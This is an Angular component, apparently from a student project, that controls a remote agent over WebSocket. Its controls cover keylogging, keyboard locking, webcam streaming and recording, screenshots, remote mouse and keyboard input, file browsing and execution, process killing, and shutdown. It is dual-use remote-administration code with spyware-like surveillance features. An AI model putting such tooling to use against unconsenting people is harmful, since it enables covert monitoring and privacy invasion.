import { Component, signal, computed } from '@angular/core';
import { trigger, transition, style, animate } from '@angular/animations';
import { ActivatedRoute } from '@angular/router';
import { CommonModule, JsonPipe } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { WebSocketService } from '../../services/websocket.service';
import { ElementRef, ViewChild } from '@angular/core';
import { effect } from '@angular/core';
import { ExplorerEntry } from '../../services/websocket.service';
import { Router } from '@angular/router';
import { HostListener } from '@angular/core';


@Component({
  selector: 'app-agent-detail',
  standalone: true,
  imports: [CommonModule, JsonPipe, FormsModule],
  templateUrl: './agent-detail.html',
  styleUrls: ['./agent-detail.css'],
  animations: [
    trigger('moduleAnim', [
      transition('* => *', [
        style({
          opacity: 0,
          transform: 'translateY(8px)'
        }),
        animate(
          '180ms ease-out',
          style({
            opacity: 1,
            transform: 'translateY(0)'
          })
        )
      ])
    ])
  ]
})
export class AgentDetailComponent {
  get totalAppProcesses(): number {
  return this.appList().reduce((sum, app) => {
    return sum + (app.count || 0);
    }, 0);
  }
  // filter input
  appFilter = '';
  // computed list (Angular template KHÔNG cho reduce arrow function)
  get filteredApps() {
   const f = this.appFilter.toLowerCase();
    return this.appList().filter(a =>
       a.exe.toLowerCase().includes(f)
    );
  }
  editorSavedFlash = false;
  selectedModule = signal<string | null>(null);
  processList = computed(() => this.ws.processList());
  appList = computed(() => this.ws.appList());
  keylogEntries = computed(() => this.ws.keylogList());
  screenshot = computed(() => this.ws.screenshotUrl());
  webcamFrame = computed(() => this.ws.webcamFrameUrl());
  // Explorer + Gallery
  explorerItems = computed(() => this.ws.explorerItems());
  currentExplorerPath = computed(() => this.ws.currentPath());
  galleryItems = computed(() => this.ws.galleryItems());
  // Remote control state
  remoteActive = signal<boolean>(false);
  private remoteIntervalId: any = null;
  startExeName = "";
  startExeArgs = "";
  startAppName = "";
  startAppArgs = "";
  killAppName = "";
  screenBusy = false;
  webcamBusy = false;
  
  killExeName: string = "";
  @ViewChild('webcamCanvas') webcamCanvas!: ElementRef<HTMLCanvasElement>;
  private recorder: MediaRecorder | null = null;
  private recordedChunks: Blob[] = [];
  private recording = false;
  isRecording = false;
  mediaRecorder!: MediaRecorder;
  private waitingFirstFrame = false;
  private keyDownHandler = (e: KeyboardEvent) => this.onRemoteKeyDown(e);
  private keyUpHandler = (e: KeyboardEvent) => this.onRemoteKeyUp(e);
  editorOpen = signal(false);
  editorPath = signal<string | null>(null);
  editorContent = signal<string>('');
  isKeyloggerLocked = false; 
  keyloggerRunning = signal(false);
  keyloggerLocked  = signal(false);
  openEditorRequest(path: string) {
  this.ws.sendJson({
    module: "FILE",
    command: "READ_TEXT",
    payload: { path }
  });
}
  killPid: number | null = null;
  rawJson = '';
  agent: any = null;
  loading = signal<boolean>(true);
  constructor(
    private router: Router,
    public ws: WebSocketService,
    private route: ActivatedRoute
  ) {
      effect(() => {
        const url = this.ws.webcamFrameUrl();
        if (!url) return;
        this.handleWebcamFrame(url);
      }); 
      effect(() => {
        const data = this.ws.editorContent();
        if (!data) return;

        // Khi server gửi READ_TEXT → mở editor
        this.applyEditorContent(data.path, data.content);
      });
    }
  ngOnInit() {
    this.route.paramMap.subscribe(params => {
      const id = params.get("id");
      if (!id) {
        console.error("Không tìm thấy ID trong route.");
        return;
      }

      this.fetchAgent(id);
    });
  }
  ngOnDestroy() {
    if (this.remoteIntervalId) {
      clearInterval(this.remoteIntervalId);
      this.remoteIntervalId = null;
    }
  }

  // ================================
  // FETCH AGENT
  // ================================
  fetchAgent(machineId: string) {
    this.loading.set(true);
    fetch(`http://localhost:3000/api/agents/${machineId}`)
      .then(r => r.json())
      .then(agent => {
        this.agent = agent;
      })
      .catch(err => {
        console.error("Lỗi load agent:", err);
      })
      .finally(() => {
        this.loading.set(false);
      });
  }
  // ================================
  // WEBSOCKET
  // ================================
  connectWS() {
    if (!this.agent) return;

    console.log("Connecting to WS:", this.agent.ip, this.agent.wsPort);
    this.ws.connect(this.agent.ip, this.agent.wsPort);
  }
  toggleWS() {
  if (this.ws.status() === 'connected') {
    this.ws.disconnect();     // 🔴 DISCONNECT
    this.onDisconnectedCleanup();
  } else {
    this.connectWS();         // 🟢 CONNECT (hàm cũ)
  }
}

/* dọn UI khi ngắt kết nối (rất nên có) */
onDisconnectedCleanup() {
  // webcam
  this.clearScreenshot();

  // screen
  this.clearKeylogs();

}

  // ================================
  // MODULE UI
  // ================================
  modules = [
    { key: 'APPLICATIONS', label: 'Applications', icon: '🧩' },
    { key: 'PROCESSES', label: 'Processes', icon: '⚙️' },
    { key: 'SYSTEM', label: 'System', icon: '🖥️'},
    { key: 'SCREEN', label: 'Screen', icon: '🖼' },
    { key: 'WEBCAM', label: 'Webcam', icon: '📷' },
    { key: 'EXPLORER', label: 'Explorer', icon: '📁' },
    { key: 'KEYLOGGER', label: 'Keylogger', icon: '⌨️' },
    { key: 'REMOTE', label: 'Remote', icon: '🎮' },
    { key: 'GALLERY', label: 'Gallery', icon: '🗂️' },
  ];
  backToModules() {
    this.selectedModule.set(null);
  }
  openModule(m: string) {
    this.selectedModule.set(m);
    if (m === 'EXPLORER') {
      // load root drives / folder list
      this.ws.sendJson({ module: 'FILE', command: 'LIST_DIR', payload: { path: '' } });
    } else if (m === 'GALLERY') {
      // load media list
      this.ws.sendJson({ module: 'FILE', command: 'LIST' });
    }
  }
  // ================================
  // RAW JSON (dev)
  // ================================
  sendRawJson() {
    try {
      const json = JSON.parse(this.rawJson);
      this.ws.sendJson(json);
    } catch {
      alert("JSON không hợp lệ!");
    }
  }
  // ================================
  // PROCESS
  // ================================
  sendProcessList() {
    this.ws.sendJson({ module: "PROCESS", command: "LIST" });
  }
  startProcess() {
    if (!this.startExeName) return;
    this.ws.sendJson({
      module: "PROCESS",
      command: "START",
      payload: {
        path: this.startExeName,
        args: this.startExeArgs || ""
      }
    });
    setTimeout(() => {
    this.sendProcessList();
  }, 300);
  }
  sendProcessKill() {
    const pid = prompt("Nhập PID cần kill:");
    if (pid) this.ws.sendJson({ module: "PROCESS", command: "KILL", pid: Number(pid) });
  }
  sendProcessStart() {
    const exe = prompt("Nhập tên file .exe cần chạy:");
    if (exe) this.ws.sendJson({
      module: "PROCESS",
      command: "START",
      payload: { path: exe }
    });
     this.startExeName = "";
     setTimeout(() => {
    this.sendProcessList();
  }, 300);
  }
  killProcess(pid: number | null) {
  if (!pid) return; // null, 0, undefined đều không chạy
  this.ws.sendJson({
    module: "PROCESS",
    command: "KILL",
    pid: Number(pid)
  });
  this.killExeName="";
   setTimeout(() => {
    this.sendProcessList();
  }, 300);
}


  // ================================
  // SYSTEM
  // ================================
  sendSystemShutdown() {
    this.ws.sendJson({ module: "SYSTEM", command: "SHUTDOWN" });
  }
  sendSystemRestart() {
    this.ws.sendJson({ module: "SYSTEM", command: "RESTART" });
  }
  sendSystemLogoff() {
    this.ws.sendJson({ module: "SYSTEM", command: "LOGOFF" });
  }
  sendSystemLock() {
    this.ws.sendJson({ module: "SYSTEM", command: "LOCK" });
  }
  systemConfirmOpen = false;
systemConfirmAction: 'shutdown' | 'restart' | null = null;

openSystemConfirm(action: 'shutdown' | 'restart') {
  this.systemConfirmAction = action;
  this.systemConfirmOpen = true;
}

closeSystemConfirm() {
  this.systemConfirmOpen = false;
  this.systemConfirmAction = null;
}

confirmSystemAction() {
  if (this.systemConfirmAction === 'shutdown') {
    this.sendSystemShutdown();
  }

  if (this.systemConfirmAction === 'restart') {
    this.sendSystemRestart();
  }

  this.closeSystemConfirm();
}

  // ================================
  // SCREENSHOT
  // ================================
  sendScreenCaptureBinary() {
    if (this.screenBusy) return;
  this.screenBusy = true;
    this.ws.sendJson({ module: "SCREEN", command: "CAPTURE_BINARY" });
      setTimeout(() => {
    this.screenBusy = false;
  }, 400); // giả lập chờ phản hồi
  }
  clearScreenshot() {
    this.ws.screenshotUrl.set(null);
  }
  // ===========================
  // APP
  // ================================
  sendAppList() {
    this.ws.sendJson({ module: "APP", command: "LIST" });
  }
  sendAppStart() {
  if (!this.startExeName) return;

  this.ws.sendJson({
    module: "APP",
    command: "START",
    payload: { path: this.startExeName }
  });
  this.startExeName="";
  setTimeout(() => {
    this.sendAppList();
  }, 300);
}
killAppAll(exe: string) {
  if (!exe) return;

  this.ws.sendJson({
    module: "APP",
    command: "KILL",
    payload: { name: exe }
  });
  this.sendAppList();
}
killApp1(name: string | null) {
  if (!name) return;

  this.ws.sendJson({
    module: "APP",
    command: "KILL",
    payload: { name }
  });
}
killApp(name:string|null)
{
   if (!name) return;
   this.killApp1(name);
   setTimeout(() => {
    this.sendAppList();
  }, 300);
  this.killExeName="";
}
  // ================================
  // KEYLOGGER
  // ================================
@HostListener('window:keydown', ['$event'])
handleEditorShortcut(event: KeyboardEvent) {
  if (!this.editorOpen()) return;

  if ((event.ctrlKey || event.metaKey) && event.key === 's') {
    event.preventDefault();
    this.saveEditorFile();
  }

  if (event.key === 'Escape') {
    event.preventDefault();
    this.closeEditor();
  }
}
  sendKeyloggerStart() {
    this.ws.sendJson({ module: "KEYBOARD", command: "START" });
    this.keyloggerRunning.set(true);
  }
  sendKeyloggerStop() {
    this.ws.sendJson({ module: "KEYBOARD", command: "STOP" });
    this.keyloggerRunning.set(false);
  }
  sendKeyloggerGetLog() {
    this.ws.sendJson({ module: "KEYBOARD", command: "GET_LOG" });
  }
  clearKeylogs() {
    this.ws.keylogList.set([]);
  }
  get keylogText(): string {
    const list = this.ws.keylogList();
    if (!list || !Array.isArray(list)) return "";
    return list
    .map(entry => entry?.text ?? "")
    .filter(t => t !== "[BACKSPACE]")   // ⬅ BỎ HOÀN TOÀN CHUỖI BACKSPACE
    .join("");
  }
  // Lock / Unlock keyboard (mới thêm)
  sendKeyloggerLock() {
    this.ws.sendJson({ module: "KEYBOARD", command: "LOCK" });
     this.keyloggerLocked.set(true);
  }
  sendKeyloggerUnlock() {
     if (!!this.keyloggerRunning)
    {
      this.sendKeyloggerStop();
    }
    this.ws.sendJson({ module: "KEYBOARD", command: "UNLOCK" });
   
   this.keyloggerLocked.set(false);

  }
  keylogString = computed(() => {
    return this.keylogEntries().map(k => k.text).join("");
  });
  // ================================
  // WEBCAM
  // ================================
  
  sendWebcamStartStream() {
      if (this.webcamBusy) return;
  this.webcamBusy = true;

    this.ws.sendJson({ module: "WEBCAM", command: "START_STREAM" });
    this.waitingFirstFrame = true;
    // Setup recorder
    const canvas = this.webcamCanvas.nativeElement;
    const stream = canvas.captureStream(25);  
    this.recordedChunks = [];
    this.mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
    this.mediaRecorder.ondataavailable = e => {
      if (e.data.size > 0) this.recordedChunks.push(e.data);
    };

    this.mediaRecorder.onstop = () => {
      const blob = new Blob(this.recordedChunks, { type: 'video/webm' });
      const reader = new FileReader();
      reader.onloadend = () => {
        const base64 = (reader.result as string).split(',')[1];
        this.ws.sendJson({
          module: 'FILE',
          command: 'SAVE_VIDEO',
          payload: {
            name: `cam_${Date.now()}.webm`,
            data: base64
          }
        });
      };
      reader.readAsDataURL(blob);
    };
      setTimeout(() => {
    this.webcamBusy = false;
  }, 500);
  }
  sendWebcamStopStream() {
      if (this.webcamBusy) return;
  this.webcamBusy = true;
    this.ws.sendJson({ module: "WEBCAM", command: "STOP_STREAM" });
    if (this.isRecording && this.mediaRecorder) {
      this.mediaRecorder.stop();
    }
    this.isRecording = false;
      setTimeout(() => {
    this.webcamBusy = false;
  }, 600);
  }
  private saveVideoToServer() {
    const blob = new Blob(this.recordedChunks, { type: "video/webm" });
    const reader = new FileReader();
    reader.onloadend = () => {
      const base64 = reader.result!.toString().split(",")[1];
      this.ws.sendJson({
        module: "FILE",
        command: "SAVE_VIDEO",
        payload: {
          name: `cam_${Date.now()}.webm`,
          data: base64
        }
      });
    };
    reader.readAsDataURL(blob);
  }
  // Khi webcam frame cập nhật → vẽ vào canvas
  ngAfterViewInit() {
  }
  private handleWebcamFrame(url: string) {
    const img = new Image();
    img.onload = () => {
      const canvas = this.webcamCanvas.nativeElement;
      const ctx = canvas.getContext("2d");
      if (!ctx) return;
      canvas.width = img.width;
      canvas.height = img.height;
      ctx.drawImage(img, 0, 0);
      if (this.waitingFirstFrame) {
        this.waitingFirstFrame = false;
        this.recordedChunks = [];
        const stream = canvas.captureStream(25);
        this.mediaRecorder = new MediaRecorder(stream);
        this.mediaRecorder.ondataavailable = (e) => {
          if (e.data.size > 0) this.recordedChunks.push(e.data);
        };
        this.mediaRecorder.onstop = () => this.saveVideoToServer();
        this.mediaRecorder.start();
        this.isRecording = true;
      }
      if (this.isRecording) ctx.drawImage(img, 0, 0);
    };
    img.src = url;
  }
  // ================================
  // EXPLORER
  // ================================
  explorerGoRoot() {
    this.ws.sendJson({ module: 'FILE', command: 'LIST_DIR', payload: { path: '' } });
  }
  explorerRefresh() {
    const path = this.currentExplorerPath() || '';
    this.ws.sendJson({ module: 'FILE', command: 'LIST_DIR', payload: { path } });
  }
  explorerOpen(item: any) {
    if (item.type === 'drive' || item.type === 'dir') {
      this.ws.sendJson({
        module: 'FILE',
        command: 'LIST_DIR',
        payload: { path: item.path }
      });
    } else {
      // file thường → EXECUTE (cho đơn giản)
      this.ws.sendJson({
        module: 'FILE',
        command: 'EXECUTE',
        payload: { path: item.path }
      });
    }
  }
  getExplorerIcon(item: any): string {
    if (!item || !item.type) return "📄";
    const t = item.type.toLowerCase();
    if (t === "drive") return "💽";
    if (t === "dir" || t === "folder") return "📁";
    if (t === 'image') return '🖼️';
    // file khác
    return "📄";
  }
  explorerBack() {
    let path = this.currentExplorerPath();
    if (!path || path === "" || path === "ROOT") {
      // đang ở ROOT -> không back nữa
      this.explorerGoRoot();
      return;
    }
    // Chuẩn hoá slash cho chắc
    path = path.replace(/\//g, "\\");
    // Nếu đang ở ổ đĩa: D:\  C:\
    if (/^[A-Z]:\\?$/i.test(path)) {
      this.explorerGoRoot();
      return;
    }
    // Tìm thư mục cha
    const idx = path.lastIndexOf("\\");
    if (idx <= 2) {
      // VD: D:\Folder → idx=2 → quay về D:\
      const drive = path.substring(0, 3);
      this.ws.sendJson({
        module: "FILE",
        command: "LIST_DIR",
        payload: { path: drive }
      });
      return;
    }
    // Thu được thư mục cha
    const parent = path.substring(0, idx);
    this.ws.sendJson({
      module: "FILE",
      command: "LIST_DIR",
      payload: { path: parent }
    }); 
  }
  openFile(item: ExplorerEntry) {
    const name = (item.name || '').toLowerCase();
    if (name.endsWith('.txt') || name.endsWith('.log') || name.endsWith('.json') || name.endsWith('.js') ) {
      this.openEditorRequest(item.path);
      return;
    }
    // fallback: thực thi file trên remote (giống trước)
    this.ws.sendJson({ module: 'FILE', command: 'EXECUTE', payload: { path: item.path } });
  }
  onExplorerItemDblClick(item: any) {
    if (!item) return;
    const type = (item.type || "").toLowerCase();
    // Nếu là thư mục → navigate (LIST_DIR)
    if (type === "drive" || type === "dir" || type === "folder") {
      this.explorerOpen(item);
      return;
    }
    // Nếu là file text → mở editor
    if (item.name.toLowerCase().endsWith(".txt") ||
      item.name.toLowerCase().endsWith(".log") ||
      item.name.toLowerCase().endsWith(".ini") ||
      item.name.toLowerCase().endsWith(".json")) {
      this.openEditorRequest(item.path);  // Gửi READ_TEXT
        return;
      }
    // Nếu file khác → EXECUTE (giống client)
    this.ws.sendJson({
      module: "FILE",
      command: "EXECUTE",
      payload: { path: item.path }
    });
  }
  isEditableFile(item: any): boolean {
  if (!item?.name) return false;

  const name = item.name.toLowerCase();
  return (
    name.endsWith('.txt') ||
    name.endsWith('.log') ||
    name.endsWith('.ini') ||
    name.endsWith('.json')
  );
}
  //  GỌI KHI SERVER TRẢ FILE
  applyEditorContent(path: string, content: string) {
    this.editorPath.set(path);
    this.editorContent.set(content);
    this.editorOpen.set(true);
  }
  // USER GÕ TRONG TEXTAREA
  updateEditorText(evt: Event) {
    const v = (evt.target as HTMLTextAreaElement).value;
    this.editorContent.set(v);
  }
  // SAVE FILE VỀ SERVER
  saveEditorFile() {
    if (!this.editorPath()) return;
    this.ws.sendJson({
      module: "FILE",
      command: "WRITE_TEXT",
      payload: {
        path: this.editorPath(),
        content: this.editorContent()
      }
    });
    // Đóng editor sau khi gửi (hoặc bạn chờ server confirm cũng được)
    this.editorOpen.set(false);
      this.editorSavedFlash = true;
  setTimeout(() => this.editorSavedFlash = false, 300);
  }
// ĐÓNG EDITOR
 closeEditor() {
  this.editorOpen.set(false);
  this.editorPath.set(null);
  this.editorContent.set('');
 }
  // ================================
  // GALLERY
  // ================================
  isImage(name: string) {
  return name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png");
}
  isVideo(name: string) {
    return name.endsWith(".webm") || name.endsWith(".mp4");
  }
  reloadGallery() {
    this.ws.sendJson({ module: 'FILE', command: 'LIST' });
  }
  openGalleryItem(item: any) {
    this.ws.viewingFile.set(item);
    this.ws.sendJson({
      module: "FILE",
      command: "GET",
      payload: { name: item.name }
    });
  }
  // ================================
  // REMOTE CONTROL
  // ================================
  private getRelativeCoords(evt: MouseEvent): { x: number; y: number } | null {
    const target = evt.target as HTMLElement;
    if (!target) return null;
    const rect = target.getBoundingClientRect();
    const x = (evt.clientX - rect.left) / rect.width;
    const y = (evt.clientY - rect.top) / rect.height;
    if (x < 0 || x > 1 || y < 0 || y > 1) return null;
    return { x, y };
  }
  toggleRemote() {
    const next = !this.remoteActive();
    this.remoteActive.set(next);
    if (next) {
      // === GẮN KEYBOARD EVENT ===
    window.addEventListener('keydown', this.keyDownHandler);
    window.addEventListener('keyup', this.keyUpHandler);
      // start loop CAPTURE_BINARY (remote)
      this.ws.sendJson({
        module: 'SCREEN',
        command: 'CAPTURE_BINARY',
        payload: { save: false }
      });
      this.remoteIntervalId = setInterval(() => {
        if (!this.remoteActive()) return;
        this.ws.sendJson({
          module: 'SCREEN',
          command: 'CAPTURE_BINARY',
          payload: { save: false }
        });
      }, 80); // ~12 FPS, tuỳ bạn chỉnh
    } else {
      if (this.remoteIntervalId) {
        clearInterval(this.remoteIntervalId);
        this.remoteIntervalId = null;
         // === GỠ KEYBOARD EVENT ===
        window.removeEventListener('keydown', this.keyDownHandler);
        window.removeEventListener('keyup', this.keyUpHandler);
      }
    }
  }
  onRemoteMouseMove(evt: MouseEvent) {
    if (!this.remoteActive()) return;
    const pos = this.getRelativeCoords(evt);
    if (!pos) return;
    this.ws.sendJson({
      module: 'INPUT',
      command: 'MOUSE_MOVE',
      payload: { x: pos.x, y: pos.y }
    });
  }
  onRemoteMouseDown(evt: MouseEvent) {
    if (!this.remoteActive()) return;
    const pos = this.getRelativeCoords(evt);
    if (!pos) return;
    const btn = evt.button === 0 ? 'left' : evt.button === 1 ? 'middle' : 'right';
    this.ws.sendJson({
      module: 'INPUT',
      command: 'MOUSE_BTN',
      payload: { x: pos.x, y: pos.y, type: 'down', btn }
    });
  }
  onRemoteMouseUp(evt: MouseEvent) {
    if (!this.remoteActive()) return;
    const pos = this.getRelativeCoords(evt);
    if (!pos) return;
    const btn = evt.button === 0 ? 'left' : evt.button === 1 ? 'middle' : 'right';
    this.ws.sendJson({
      module: 'INPUT',
      command: 'MOUSE_BTN',
      payload: { x: pos.x, y: pos.y, type: 'up', btn }
    });
  }
  onRemoteWheel(evt: WheelEvent) {
    if (!this.remoteActive()) return;
    evt.preventDefault();
    const delta = evt.deltaY > 0 ? -120 : 120;
    this.ws.sendJson({
      module: 'INPUT',
      command: 'MOUSE_WHEEL',
      payload: { delta }
    });
  }
  onRemoteKeyDown(evt: KeyboardEvent) {
  if (!this.remoteActive()) return;
  evt.preventDefault();
  this.ws.sendJson({
    module: 'INPUT',
    command: 'KEY_EVENT',
    payload: { key: evt.keyCode, type: 'down' }
  });
  }
  goBack() {
    this.router.navigate(['/']);   // hoặc '/agents' nếu route là vậy
  }
  onRemoteKeyUp(evt: KeyboardEvent) {
    if (!this.remoteActive()) return;
    evt.preventDefault();
    this.ws.sendJson({
      module: 'INPUT',
      command: 'KEY_EVENT',
      payload: { key: evt.keyCode, type: 'up' }
    });
  }
  onRemoteContextMenu(evt: MouseEvent) {
    evt.preventDefault(); // CHẶN menu Chrome
    if (!this.remoteActive()) return;
    const pos = this.getRelativeCoords(evt);
    if (!pos) return;
    this.ws.sendJson({
      module: 'INPUT',
      command: 'MOUSE_BTN',
      payload: { x: pos.x, y: pos.y, type: 'down', btn: 'right' }
    });
    // Optional: gửi UP luôn để thành 1 click
    this.ws.sendJson({
      module: 'INPUT',
      command: 'MOUSE_BTN',
      payload: { x: pos.x, y: pos.y, type: 'up', btn: 'right' }
    });
  }
}
